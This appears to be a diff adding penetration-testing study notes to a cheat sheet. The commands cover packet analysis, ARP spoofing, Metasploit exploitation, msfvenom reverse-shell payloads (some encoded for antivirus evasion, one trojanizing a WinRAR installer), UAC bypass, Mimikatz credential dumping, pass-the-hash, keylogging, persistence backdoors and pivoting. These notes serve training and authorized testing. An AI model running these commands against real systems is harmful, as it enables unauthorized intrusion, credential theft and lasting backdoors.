@@ -1013,260 +1013,846 @@ set SHA512 true
 ## [Network Based Attacks](hostnetwork-penetration-testing/2-network-attack.md)
 
 ```bash
-#
+wireshark -i eth1
+
+# TSHARK
+tshark -D
+tshark -i eth1
+tshark -r <FILE>.pcap
+tshark -r <FILE>.pcap | wc -l
+
+# First 100 packets
+tshark -r <FILE>.pcap -c 100
+
+# Protocl hierarchy statistics
+tshark -r <FILE>.pcap -z io,phs -q
+
+# HTTP traffic
+tshark -r <FILE>.pcap -Y 'http' | more
+tshark -r <FILE>.pcap -Y "ip.src==<SOURCE_IP> && ip.dst==<DEST_IP>"
+
+# Only GET requests
+tshark -r <FILE>.pcap -Y "http.request.method==GET"
+
+# Packets with frame time, source IP and URL for all GET requests
+tshark -r <FILE>.pcap -Y "http.request.method==GET" -Tfields -e frame.time -e ip.src -e http.request.full_uri
+
+# Packets with a string
+tshark -r <FILE>.pcap -Y "http contains password"
+
+# Check destination IP
+tshark -r <FILE>.pcap -Y "http.request.method==GET && http.host==<TARGET_URL>" -Tfields -e ip.dst
+
+# Check session ID
+tshark -r <FILE>.pcap -Y "ip contains amazon.in && ip.src==<IP>" -Tfields -e ip.src -e http.cookie
+
+# Check OS/User Agent type
+tshark -r <FILE>.pcap -Y "ip.src==<IP> && http" -Tfields -e http.user_agent
+
+# WiFi traffic filter
+tshark -r <FILE>.pcap -Y "wlan"
+
+# Only deauthentication packets 
+tshark -r <FILE>.pcap -Y "wlan.fc.type_subtype==0x000c"
+# and devices
+tshark -r <FILE>.pcap -Y "wlan.fc.type_subtype==0x000c" -Tfields -e wlan.ra
+
+# Only WPA handshake packets
+tshark -r <FILE>.pcap -Y "eapol"
+
+# Onyl SSID/BSSID
+tshark -r <FILE>.pcap -Y "wlan.fc.type_subtype==8" -Tfields -e wlan.ssid -e wlan.bssid
+
+tshark -r <FILE>.pcap -Y "wlan.ssid==<SSID>" -Tfields -e wlan.bssid
+
+# WiFi Channel
+tshark -r <FILE>.pcap -Y "wlan.ssid==<SSID>" -Tfields -e wlan_radio.channel
+
+# Vendor & model
+tshark -r <FILE>.pcap -Y "wlan.ta==<DEVICE_MAC> && http" -Tfields -e http.user_agent
+```
+
+```bash
+# ARP POISONING - arpspoof
+
+## Forward IP packets
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+arpspoof -i eth1 -t <TARGET_IP> -r <HOST_IP>
 ```
 
 ## [Metasploit](hostnetwork-penetration-testing/3-metasploit.md)
+
+```bash
+# MSF Install
+sudo apt update && sudo apt install metasploit-framework -y
+sudo systemctl enable postgresql
+sudo systemctl restart postgresql
+sudo msfdb init
+
+ls /usr/share/metasploit-framework
+ls ~/.msf4/modules
+```
 
 ```bash
 service postgresql start && msfconsole -q
 ```
 
 ```bash
-# WIN METERPRETER
-meterpreter > help
+# msfconsole
+db_status
+help
+version
 
-Core Commands
-=============
+show -h
+show all
+show exploits
 
-    Command                   Description
-    -------                   -----------
-    ?                         Help menu
-    background                Backgrounds the current session
-    bg                        Alias for background
-    bgkill                    Kills a background meterpreter script
-    bglist                    Lists running background scripts
-    bgrun                     Executes a meterpreter script as a background thread
-    channel                   Displays information or control active channels
-    close                     Closes a channel
-    detach                    Detach the meterpreter session (for http/https)
-    disable_unicode_encoding  Disables encoding of unicode strings
-    enable_unicode_encoding   Enables encoding of unicode strings
-    exit                      Terminate the meterpreter session
-    get_timeouts              Get the current session timeout values
-    guid                      Get the session GUID
-    help                      Help menu
-    info                      Displays information about a Post module
-    irb                       Open an interactive Ruby shell on the current session
-    load                      Load one or more meterpreter extensions
-    machine_id                Get the MSF ID of the machine attached to the session
-    migrate                   Migrate the server to another process
-    pivot                     Manage pivot listeners
-    pry                       Open the Pry debugger on the current session
-    quit                      Terminate the meterpreter session
-    read                      Reads data from a channel
-    resource                  Run the commands stored in a file
-    run                       Executes a meterpreter script or Post module
-    secure                    (Re)Negotiate TLV packet encryption on the session
-    sessions                  Quickly switch to another session
-    set_timeouts              Set the current session timeout values
-    sleep                     Force Meterpreter to go quiet, then re-establish session
-    ssl_verify                Modify the SSL certificate verification setting
-    transport                 Manage the transport mechanisms
-    use                       Deprecated alias for "load"
-    uuid                      Get the UUID for the current session
-    write                     Writes data to a channel
+search <STRING>
+search cve:2017 type:exploit platform:windows
+use <MODULE_NAME>
+set <OPTION>
+run
+execute # same as run
 
+sessions
+# Switch between sessions Ids with
+sessions 1
+# Rename sessions
+sessions -n xoda -i 1
+# Run a Meterpreter Command on the session given with `-i`
+sessions -C sysinfo -i 1
+# Terminate a specific session
+sessions -k 1
+# Terminat all sessions
+sessions -K
+# Upgrade a shell session to a Meterpreter session
+sessions -u 1
 
-Stdapi: File system Commands
-============================
+connect
 
-    Command       Description
-    -------       -----------
-    cat           Read the contents of a file to the screen
-    cd            Change directory
-    checksum      Retrieve the checksum of a file
-    cp            Copy source to destination
-    del           Delete the specified file
-    dir           List files (alias for ls)
-    download      Download a file or directory
-    edit          Edit a file
-    getlwd        Print local working directory
-    getwd         Print working directory
-    lcd           Change local working directory
-    lls           List local files
-    lpwd          Print local working directory
-    ls            List files
-    mkdir         Make directory
-    mv            Move source to destination
-    pwd           Print working directory
-    rm            Delete the specified file
-    rmdir         Remove directory
-    search        Search for files
-    show_mount    List all mount points/logical drives
-    upload        Upload a file or directory
-
-
-Stdapi: Networking Commands
-===========================
-
-    Command       Description
-    -------       -----------
-    arp           Display the host ARP cache
-    getproxy      Display the current proxy configuration
-    ifconfig      Display interfaces
-    ipconfig      Display interfaces
-    netstat       Display the network connections
-    portfwd       Forward a local port to a remote service
-    resolve       Resolve a set of host names on the target
-    route         View and modify the routing table
-
-
-Stdapi: System Commands
-=======================
-
-    Command       Description
-    -------       -----------
-    clearev       Clear the event log
-    drop_token    Relinquishes any active impersonation token.
-    execute       Execute a command
-    getenv        Get one or more environment variable values
-    getpid        Get the current process identifier
-    getprivs      Attempt to enable all privileges available to the current process
-    getsid        Get the SID of the user that the server is running as
-    getuid        Get the user that the server is running as
-    kill          Terminate a process
-    localtime     Displays the target system local date and time
-    pgrep         Filter processes by name
-    pkill         Terminate processes by name
-    ps            List running processes
-    reboot        Reboots the remote computer
-    reg           Modify and interact with the remote registry
-    rev2self      Calls RevertToSelf() on the remote machine
-    shell         Drop into a system command shell
-    shutdown      Shuts down the remote computer
-    steal_token   Attempts to steal an impersonation token from the target process
-    suspend       Suspends or resumes a list of processes
-    sysinfo       Gets information about the remote system, such as OS
-
-
-Stdapi: User interface Commands
-===============================
-
-    Command        Description
-    -------        -----------
-    enumdesktops   List all accessible desktops and window stations
-    getdesktop     Get the current meterpreter desktop
-    idletime       Returns the number of seconds the remote user has been idle
-    keyboard_send  Send keystrokes
-    keyevent       Send key events
-    keyscan_dump   Dump the keystroke buffer
-    keyscan_start  Start capturing keystrokes
-    keyscan_stop   Stop capturing keystrokes
-    mouse          Send mouse events
-    screenshare    Watch the remote user desktop in real time
-    screenshot     Grab a screenshot of the interactive desktop
-    setdesktop     Change the meterpreters current desktop
-    uictl          Control some of the user interface components
-
-
-Stdapi: Webcam Commands
-=======================
-
-    Command        Description
-    -------        -----------
-    record_mic     Record audio from the default microphone for X seconds
-    webcam_chat    Start a video chat
-    webcam_list    List webcams
-    webcam_snap    Take a snapshot from the specified webcam
-    webcam_stream  Play a video stream from the specified webcam
-
-
-Stdapi: Audio Output Commands
-=============================
-
-    Command       Description
-    -------       -----------
-    play          play a waveform audio file (.wav) on the target system
-
-
-Priv: Elevate Commands
-======================
-
-    Command       Description
-    -------       -----------
-    getsystem     Attempt to elevate your privilege to that of local system.
-
-
-Priv: Password database Commands
-================================
-
-    Command       Description
-    -------       -----------
-    hashdump      Dumps the contents of the SAM database
-
-
-Priv: Timestomp Commands
-========================
-
-    Command       Description
-    -------       -----------
-    timestomp     Manipulate file MACE attributes
+## Workspaces - db_status must be connected
+workspace
+workspace -a <NEW_WORSKSPACE>
+workspace <WORKSPACE_NAME>
+workspace -d <WORKSPACE_NAME>
 ```
 
 ```bash
-# UNIX METERPRETER
+# Payload Options
+search eternalblue
+use 0
+# ^^ specify the identifier
+set payload <PAYLOAD_NAME>
+set RHOSTS <TARGET_IP>
+run
+# or
+exploit
+```
 
+### Meterpreter
+
+```bash
+# meterpreter > <command>
+
+background
+cat
+cd
+checksum md5 /bin/bash
+clearev
+download
+edit
+execute -f ifconfig
+getenv
+getenv PATH
+getuid
+hashdump
+idletime
+ifconfig
+lpwd
+ls
+migrate
+mkdir
+ps
+pwd
+resource <file.txt>
+rmdir
+search -f *.txt
+shell
+sysinfo
+upload
+```
+
+### Info Gathering & Enumeration
+
+```bash
+workspace -a <hostname_enum>
+# NMAP Export in .XML
+nmap -Pn -sV -O <TARGET_IP> -oX <XML_FILE_NAME>
+
+# msfconsole
+db_import <XML_FILE_NAME>
+
+hosts
+services
+vulns
+loot
+creds
+notes
+
+# Nmap inside MSF
+db_nmap -Pn -sV -O <TARGET_IP>
 ```
 
 ```bash
+# Port Scan example
+workspace -a Port_scan
+search portscan
+use auxiliary/scanner/portscan/tcp
+show options
+set RHOSTS <TARGET_IP>
+set PORTS 1-1000
+run
 
+# Exploitation
+search xoda
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS <TARGET_IP>
+set TARGETURI /
+run
+
+# Pivoting to TARGET2 through TARGET1
+run autoroute -s <TARGET1_IP>
+background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <TARGET2_IP>
+run
 ```
 
-
-
-### Info Gathering
-
 ```bash
-#
+# UDP Scan
+search udp_sweep
+use auxiliary/scanner/discovery/udp_sweep
+set RHOSTS <TARGET_IP>
+run
 ```
 
-### Enumeration
-
 ```bash
-#
+# Service Enumeration
+
+# FTP
+use auxiliary/scanner/ftp/ftp_version
+use auxiliary/scanner/ftp/ftp_login
+use auxiliary/scanner/ftp/anonymous
+
+# SMB
+use auxiliary/scanner/ftp/anonymous
+use auxiliary/scanner/smb/smb_enumusers
+use auxiliary/scanner/smb/smb_enumshares
+use auxiliary/scanner/smb/smb_login
+
+# HTTP
+use auxiliary/scanner/http/apache_userdir_enum
+use auxiliary/scanner/http/brute_dirs
+use auxiliary/scanner/http/dir_scanner
+use auxiliary/scanner/http/dir_listing
+use auxiliary/scanner/http/http_put
+use auxiliary/scanner/http/files_dir
+use auxiliary/scanner/http/http_login
+use auxiliary/scanner/http/http_header
+use auxiliary/scanner/http/http_version
+use auxiliary/scanner/http/robots_txt
+
+# MYSQL
+use auxiliary/admin/mysql/mysql_enum
+use auxiliary/admin/mysql/mysql_sql
+use auxiliary/scanner/mysql/mysql_file_enum
+use auxiliary/scanner/mysql/mysql_hashdump
+use auxiliary/scanner/mysql/mysql_login
+use auxiliary/scanner/mysql/mysql_schemadump
+use auxiliary/scanner/mysql/mysql_version
+use auxiliary/scanner/mysql/mysql_writable_dirs
+
+# SSH
+use auxiliary/scanner/ssh/ssh_version
+use auxiliary/scanner/ssh/ssh_login
+use auxiliary/scanner/ssh/ssh_enumusers
+
+# SMTP
+use auxiliary/scanner/smtp/smtp_enum
+use auxiliary/scanner/smtp/smtp_version
 ```
 
 ### Vulnerability Scanning
 
 ```bash
-#
+# NMAP
+db_nmap -sS -sV -O <TARGET_IP>
+
+search type:exploit name:iis
+search <SERVICE_NAME_VERSION>
+
+# e.g.
+search eternalblue
+use auxiliary/scanner/smb/smb_ms17_010
+```
+
+```bash
+# Kali Linux terminal
+searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"
+```
+
+```bash
+# Metasploit Autopwn
+wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
+sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
+
+# msfconsole
+load db_autopwn
+
+# Enumerates exploits for each of the open ports
+db_autopwn -p -t
+# Limit to only the 445 port
+db_autopwn -p -t -PI 445
+```
+
+```bash
+# msfconsole
+analyze
+vulns
+```
+
+```bash
+# NESSUS Results Import
+db_import /home/kali/Downloads/MS3_zph3t5.nessus
+hosts
+services
+vulns
+vulns -p 445
+
+search cve:2017 name:smb
+search MS12-020
+search cve:2019 name:rdp
+search cve:2015 name:ManageEngine
+search PHP CGI Argument Injection
+```
+
+```bash
+# WMAP in msfconsole
+load wmap
+wmap_sites -a <TARGET_IP>
+wmap_sites -l
+wmap_targets -t <URL>
+wmap_targets -l
+
+wmap_run -t
+wmap_run -e
+wmap_vulns -l
+
+# msfconsole
+use auxiliary/scanner/http/http_put
 ```
 
 ### Payloads
 
 ```bash
-#
+# MSFVENOM
+msfvenom --list payloads
+msfvenom --list formats
+msfvenom --list encoders
+
+# Win 32bit
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > <PAYLOAD_FILE_x86>.exe
+
+# Win 64bit
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > <PAYLOAD_FILE_x64>.exe
+
+# Linux 32bit
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > <PAYLOAD_FILE_x86>
+
+# Linux 64bit
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > <PAYLOAD_FILE_x64>
+
+# Win 32bit + shikata_ga_nai encoded
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -f exe > <PAYLOAD_ENCODED_x86>.exe
+
+# Use more encoding iterations
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f exe > <PAYLOAD_ENCODED_x86>.exe
+
+# Linux 32bit + shikata_ga_nai encoded
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f elf > <PAYLOAD_ENCODED_x86>
+
+# Inject into Portable Executables
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32-621.exe > winrar.exe
+```
+
+```bash
+# MSF STAGED Payload
+windows/x64/meterpreter/reverse_tcp
+
+# MSF NON-STAGED Payload
+windows/x64/meterpreter_reverse_https
+```
+
+```bash
+# Upload the payload on the target and try it with MSFconsole
+cd Payloads
+sudo python -m http.server 8080
+msfconsole -q
+
+use multi/handler
+set payload <MSFVENOM_PAYLOAD>
+set LHOST <MSFVENOM_LOCAL_HOST_IP>
+set LPORT <MSFVENOM_LOCAL_PORT>
+run
+```
+
+```bash
+# Automation
+ls -al /usr/share/metasploit-framework/scripts/resource
+
+# Create a handler resource
+nano handler.rc
+# Insert the following lines
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <LOCAL_HOST_IP>
+set LPORT <LOCAL_PORT>
+run
+# Save it and exit
+
+msfconsole -q -r handler.rc
+
+# msfconsole
+resource handler.rc
+
+# Export inserted msfconsole commands into a resource script
+makerc <FILE>.rc
 ```
 
 ### Win Exploitation
 
+#### Default MSF Start
+
 ```bash
-#
+service postgresql start && msfconsole -q
+```
+
+```bash
+db_status
+setg RHOSTS <TARGET_IP>
+setg RHOST <TARGET_IP>
+workspace -a <SERVICE_NAME>
+db_nmap -sS -sV -O <TARGET_IP>
+# db_nmap -sS -sV -O -p- <TARGET_IP>
+
+# For every exploit, check 'options' and 'info', setup accordingly
+```
+
+#### HFS
+
+```bash
+# HFS
+search type:exploit name:rejetto
+use exploit/windows/http/rejetto_hfs_exec
+```
+
+#### SMB
+
+```bash
+# SMB
+search type:auxiliary EternalBlue
+use auxiliary/scanner/smb/smb_ms17_010
+use exploit/windows/smb/ms17_010_eternalblue
+```
+
+#### WINRM
+
+```bash
+# WinRM
+search type:auxiliary winrm
+use auxiliary/scanner/winrm/winrm_auth_methods
+
+# Brute force WinRM login
+search winrm_login
+use auxiliary/scanner/winrm/winrm_login
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+# Launch command
+search winrm_cmd
+use auxiliary/scanner/winrm/winrm_cmd
+set USERNAME <USER>
+set PASSWORD <PW>
+set CMD whoami
+
+search winrm_script
+use exploit/windows/winrm/winrm_script_exec
+set USERNAME <USER>
+set PASSWORD <PW>
+set FORCE_VBS true
+```
+
+#### TOMCAT
+
+```bash
+# APACHE TOMCAT
+search type:exploit tomcat_jsp
+use exploit/multi/http/tomcat_jsp_upload_bypass
+check
+
+set payload java/jsp_shell_bind_tcp
+set SHELL cmd
+run
 ```
 
 ### Linux Exploitation
 
+#### FTP
+
 ```bash
-#
+# FTP
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+/bin/bash -i
+```
+
+#### SAMBA
+
+```bash
+# SAMBA
+search type:exploit name:samba
+use exploit/linux/samba/is_known_pipename
+
+# After exploit, proceed with Shell To Meterpreter if necessary
+```
+
+#### SSH
+
+```bash
+# SSH
+search libssh_auth_bypass
+use auxiliary/scanner/ssh/libssh_auth_bypass
+set SPAWN_PTY true
+run
+sessions
+sessions 1
+
+# After exploit, proceed with Shell To Meterpreter if necessary
+```
+
+```bash
+# Some shell enumeration
+id
+cat /etc/*release
+uname -r
+```
+
+#### SMTP
+
+```bash
+# SMTP
+search libssh_auth_bypass
+use exploit/linux/smtp/haraka
+set SRVPORT 9898
+set email_to root@attackdefense.test
+set payload linux/x64/meterpreter_reverse_http
+set LHOST <LOCAL_IP>
+set LPORT 8080
+run
+# This is a NON-staged payload
+```
+
+### Post-Exploitation Fundamentals
+
+```bash
+# METERPRETER
+run post/windows/manage/migrate
+## Pivoting
+portfwd add -l <LOCAL_PORT>  -p <TARGET_PORT> -r <TARGET_IP>
+```
+
+```bash
+# Manual SHELL TO METERPRETER
+background # or CTRL+Z
+sessions
+search shell_to_meterpreter
+use post/multi/manage/shell_to_meterpreter
+set SESSION 1
+set LHOST <LOCAL_IP>
+run
+
+sessions
+sessions 2
+
+# Auto SHELL TO METERPRETER
+sessions -u 1
+sessions 3
 ```
 
 ### Win Post-Exploitation
 
+#### HTTP/HFS
+
 ```bash
-#
+# Meterpreter
+sysinfo
+getuid
+getsystem
+getuid
+getprivs
+hashdump
+show_mount
+ps
+migrate
+
+# msfconsole
+use post/windows/manage/migrate
+use post/windows/gather/win_privs
+use post/windows/gather/enum_logged_on_users
+use post/windows/gather/checkvm
+use post/windows/gather/enum_applications
+use post/windows/gather/enum_av_excluded
+use post/windows/gather/enum_computers
+use post/windows/gather/enum_patches
+use post/windows/gather/enum_shares
+use post/windows/manage/enable_rdp
+set SESSION 1
+
+loot
+```
+
+#### UAC
+
+```bash
+# Meterpreter
+shell
+
+# Win CMD
+net users
+net localgroup administrators
+
+# Bypass UAC
+background
+sessions
+use exploit/windows/local/bypassuac_injection
+set payload windows/x64/meterpreter/reverse_tcp
+set SESSION 1
+set LPORT <LOCAL_PORT>
+set TARGET Windows\ x64
+
+getsystem
+hashdump
+```
+
+#### TOKEN IMPERSONATION
+
+```bash
+# Privilege Escalation - Meterpreter
+getuid
+getprivs
+hashdump
+load incognito
+list_tokens -u
+impersonate_token "ATTACKDEFENSE\Administrator"
+getuid
+ps
+migrate <PID>
+hashdump
+```
+
+#### DUMP HASHES
+
+```bash
+# Kiwi - Meterpreter
+load kiwi
+creds_all
+lsa_dump_sam
+lsa_dump_secrets
+
+# Mimikatz - Meterpreter
+cd C:\\
+mkdir Temp
+cd Temp
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+shell
+
+mimikatz.exe
+privilege::debug
+lsadump::sam
+lsadump::secrets
+sekurlsa::logonPasswords
+```
+
+```bash
+# PASS THE HASH - PSExec
+hashdump
+exit
+search psexec
+use exploit/windows/smb/psexec
+set payload windows/x64/meterpreter/reverse_tcp
+set SMBUser Administrator
+set SMBPass <ADMINISTRATOR_LM:NTLM_HASH>
+```
+
+#### PERSISTENCE
+
+```bash
+# Administrative Privileges required!
+
+# RDP - Meterpreter
+background
+
+use exploit/windows/local/persistence_service
+set payload windows/meterpreter/reverse_tcp
+set SESSION 1
+
+# Regain access
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <LOCAL_IP>
+set LPORT <LOCAL_PORT>
+
+# Enabling RDP
+use post/windows/manage/enable_rdp
+sessions
+set SESSION 1
+```
+
+```bash
+# KEYLOGGING - Meterpreter
+keyscan_start
+keyscan_dump
+keyscan_stop
+```
+
+#### CLEARING
+
+```bash
+# Meterpreter
+clearenv
+```
+
+#### PIVOTING
+
+```bash
+# Meterpreter
+run autoroute -s <TARGET1_SUBNET_NETWORK>
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <TARGET2_IP>
+set PORTS 1-100
+
+# Port Forwarding
+sessions 1
+portfwd add -l <LOCAL_PORT> -p <TARGET2_PORT> -r <TARGET2_IP>
+background
+db_nmap -sS -sV -p <LOCAL_PORT> localhost
+# Target2 Exploitation
+use exploit/windows/http/badblue_passthru
+set payload windows/meterpreter/bind_tcp
+set RHOSTS <TARGET2_IP>
+set LPORT <LOCAL_PORT2>
+run
 ```
 
 ### Linux Post-Exploitation
 
 ```bash
-#
+# Meterpreter - 'root' user
+shell
+
+# Local machine Enumeration
+/bin/bash -i
+whoami
+cat /etc/passwd
+groups root
+cat /etc/*issue
+cat /etc/*release
+uname -a
+uname -r
+
+netstat -antp
+ss -tnl
+
+ps aux
+env
+
+# msfconsole
+use post/linux/gather/enum_configs
+use post/multi/gather/env
+use post/linux/gather/enum_network
+use post/linux/gather/enum_protections
+use post/linux/gather/enum_system
+use post/linux/gather/checkcontainer
+use post/linux/gather/checkvm
+use post/linux/gather/enum_users_history
+set SESSION 1
+
+loot
+```
+
+```bash
+# PRIVILEGE ESCALATION - chkrootkit
+ps aux
+use exploit/unix/local/chkrootkit
+set CHKROOTKIT /bin/chkrootkit
+set SESSION 1
+set LHOST <LOCAL_IP>
+```
+
+```bash
+# Dumping Hashes
+use post/linux/gather/hashdump
+use post/multi/gather/ssh_creds
+use post/linux/gather/ecryptfs_creds
+use post/linux/gather/enum_psk
+use post/linux/gather/pptpd_chap_secrets
+set SESSION 1
+```
+
+```bash
+# PERSISTENCE
+# Meterpreter - Manual
+shell
+
+whoami
+	root
+cat /etc/passwd
+useradd -m ftp -s /bin/bash
+passwd ftp
+usermod -aG root ftp
+usermod -u 15 ftp
+groups ftp
+
+# SSH Key
+use post/linux/manage/sshkey_persistence
+set CREATESSHFOLDER true
+set SESSION 1
+
+# Persistence Test
+loot
+cat /root/.msf4/loot/DATE_Linux_Persistenc_<TARGET_IP>_id_rsa_.txt
+# Exit all the msfconsole sessions and close it
+exit -y
+
+vim ssh_key # paste Key
+chmod 0400 ssh_key
+ssh -i ssh_key root@<TARGET_IP>
 ```
 
 ### Armitage
 
 ```bash
-#
+# Armitage Kali Linux - Install
+sudo apt install armitage -y
+sudo msfdb init
+sudo nano /etc/postgresql/15/main/pg_hba.conf
+# On line 87 switch “scram-sha-256” to “trust”
+sudo systemctl enable postgresql
+sudo systemctl restart postgresql
+sudo armitage
 ```
 
 ## [Exploitation](hostnetwork-penetration-testing/4-exploitation.md)
